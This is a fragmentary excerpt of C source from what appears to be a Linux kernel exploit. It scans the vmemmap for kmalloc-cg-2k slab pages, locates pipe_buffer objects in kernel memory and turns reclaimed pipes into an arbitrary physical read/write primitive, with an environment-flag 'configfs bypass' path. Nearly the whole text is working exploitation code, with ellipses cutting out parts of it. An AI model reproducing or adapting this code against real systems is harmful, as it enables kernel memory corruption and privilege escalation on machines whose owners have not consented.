...
uintptr_t prepare_pipe_buffer_page(void) {
  ...
  pr_info("pipe-prep forked child pid=%d\n", child);
...
int pipe_reclaim_cache_gate(int fd) {
  ...
  uint64_t gate_slab[PIPE_CANDIDATE_PAGES];
  ssize_t gate_srd[PIPE_CANDIDATE_PAGES];
  uint32_t gate_type[PIPE_CANDIDATE_PAGES];
  ssize_t gate_trd[PIPE_CANDIDATE_PAGES];
  size_t gate_pages = 0;
  ...
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    ...
    if (gate_pages < PIPE_CANDIDATE_PAGES) {
      gate_head[gate_pages] = head;
      gate_slab[gate_pages] = slab_cache;
      gate_srd[gate_pages] = srd;
      gate_type[gate_pages] = page_type;
      gate_trd[gate_pages] = trd;
      gate_pages++;
    }
...
#define PFG_MAX_PAGES 1024

#define PFG_SCAN_CHUNK 0x8000

uint64_t pipe_splice_read64(int fd, uintptr_t addr) {
  uint64_t v = 0;
  if (!pipe_splice_read_range(fd, addr, &v, sizeof(v))) {
    return 0;
  }
  return v;
}

uint32_t pipe_splice_read32(int fd, uintptr_t addr) {
  uint32_t v = 0;
  if (!pipe_splice_read_range(fd, addr, &v, sizeof(v))) {
    return 0;
  }
...
static int pfg_scan_range(int fd, uintptr_t cg2k, uintptr_t *pages,
  ...
  for (uintptr_t addr = start; addr < end; addr += PFG_SCAN_CHUNK) {
    ...
    chunks++;
    for (size_t off = 0; off + STRUCT_PAGE_SIZE <= sizeof(buf);
         off += STRUCT_PAGE_SIZE) {
      uint64_t slab_cache;
      memcpy(&slab_cache, buf + off + STRUCT_SLAB_CACHE_OFF,
             sizeof(slab_cache));
      if (slab_cache != cg2k) {
        continue;
      }
      if (found < max) {
        pages[found] = addr + off;
        found++;
      }
    }
  }
  pr_info("phys step global vmemmap scan done chunks=%llu candidates=%d\n",
          (unsigned long long)chunks, found);
  return found;
}
...
static int pfg_find_slab_pages(
  ...
  if (!is_direct_ptr(pipebuf_page_base)) {
    pr_warning("phys step global scan A empty, no pipebuf page to "
               "calibrate bound B\n");
    return 0;
  }
...
static int pfg_scan_page(int fd, uintptr_t page) {
  uintptr_t page_direct = page_to_direct(page);
  for (size_t slot = 0; slot < PIPE_OBJS_PER_SLAB; slot++) {
    unsigned char obj[PIPE_OBJECT_SIZE];
    if (kernel_read_data(fd, page_direct + slot * PIPE_OBJECT_SIZE, obj,
                         sizeof(obj)) != (ssize_t)sizeof(obj)) {
      continue;
    }
    struct user_pipe_buffer pb;
    memcpy(&pb, obj, sizeof(pb));
    if (pb.page < VMEMMAP_START || pb.page >= VMEMMAP_END) {
      continue;
    }
    if (pb.offset != 0 || pb.ops != pipe_buf_ops_addr() ||
    ...
    struct user_pipe_buffer pb1;
    memcpy(&pb1, obj + sizeof(pb), sizeof(pb1));
    if (pb1.page >= VMEMMAP_START && pb1.page < VMEMMAP_END &&
        pb1.ops == pipe_buf_ops_addr()) {
      continue;
    }
    pipebuf_addr = page_direct + slot * PIPE_OBJECT_SIZE;
    pipebuf_pipe_idx = (int)pb.len - 1;
    pipe_probe_found = 1;
    pipe_probe_page = pb.page;
    pipe_probe_ops = pb.ops;
...
int pipe_find_buffer_global(int fd) {
  uintptr_t cg2k = 0;
  if (!pfg_kmalloc_cg2k(fd, &cg2k)) {
    pr_warning("phys step global scan: cg-2k cache read failed\n");
    return 0;
  }
  static uintptr_t pages[PFG_MAX_PAGES];
  int candidates = pfg_find_slab_pages(fd, cg2k, pages, PFG_MAX_PAGES);
  pr_info("phys step global scan cg2k=%016zx candidates=%d\n", cg2k,
          candidates);
  if (candidates <= 0) {
    return 0;
  }
...
int pipe_splice_read_data(
  ...
  loff_t out_off = 0;
  ssize_t sp = syscall(SYS_splice, pipefd[0], NULL, outfd, &out_off, len, 0);
  int ok = 0;
  if (sp == (ssize_t)len) {
    ssize_t got = pread(outfd, out, len, 0);
    ok = got == (ssize_t)len;
  }
  kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
  return ok;
...
int pipe_phys_write(
  ...
  while (off < len) {
    ...
    ssize_t w = write(pipefd[1], (const char *)data + off, chunk);
    if (w != (ssize_t)chunk) {
      wrote = -1;
      break;
    }
...
int pipe_splice_read_range(
  ...
  while (len > 0) {
    ...
    if (!pipe_splice_read_data_auto(fd, addr, p, chunk)) {
      return 0;
    }
    addr += chunk;
    p += chunk;
...
int pipe_phys_write_data(
  ...
  if (pipebuf_addr) {
    ...
    while (off < len) {
      ...
      ssize_t w = write(pipe_fds_reclaim[pipebuf_pipe_idx][1],
                        (const char *)data + off, chunk);
      if (w != (ssize_t)chunk) {
        wrote = -1;
        break;
      }
...
int install_pipe_physrw(int fd) {
  ...
  if (!pipe_reclaim_cache_gate(fd)) {
    pr_info("phys step cache gate failed slab=%016zx want=%016zx "
            "slot_hit=%d ptype=%u,%u,%u,%u,%u,%u,%u,%u\n",
            candidate_slab_cache, kmalloc_pipe_cache, pipe_cache_slot_hit,
            pipe_page_type[0], pipe_page_type[1], pipe_page_type[2],
            pipe_page_type[3], pipe_page_type[4], pipe_page_type[5],
            pipe_page_type[6], pipe_page_type[7]);
    if (env_flag("SLIDE_CONFIGFS_PHYSRW", 0)) {
      char marker[PIPE_RECLAIM];
      memset(marker, 0x61, sizeof(marker));
      for (size_t i = 0; i < PIPE_RECLAIM; i++) {
        SYSCHK(write(pipe_fds_reclaim[i][1], marker, i + 1));
      }
      bypassed = pipe_find_buffer_global(fd);
      pr_info("phys step configfs bypass ok=%d pipebuf=%016zx idx=%d\n",
              bypassed, pipebuf_addr, pipebuf_pipe_idx);
    }
    if (!bypassed) {
      return 0;
    }
  ...
  if (kernel_write_data(fd, seed_addr, seed, sizeof(seed)) !=
      (ssize_t)sizeof(seed)) {
    return 0;
  }
